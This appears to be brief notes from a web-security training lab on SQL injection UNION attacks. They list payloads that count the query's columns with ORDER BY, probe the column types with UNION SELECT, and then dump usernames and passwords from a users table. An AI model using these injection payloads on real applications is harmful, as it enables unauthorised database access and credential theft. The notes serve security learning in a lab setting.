Lab: SQL injection UNION attack, retrieving data from other tables

GOAL: output user and password to login using user table


Analysis

determine number of column
'order by 1--  ok
'order by 2--  ok
'order by 3--  nternal server error
so number of column = 3-1 = 2


determine data type of the column
select a,b from products where category = Lifestyle

'union select null,null--  ok
'union select 'a',null--  ok
'union select 'a','a'--  ok
so here both column return the string type value

'union select username,password from users-- ok return the user and pass
administrator
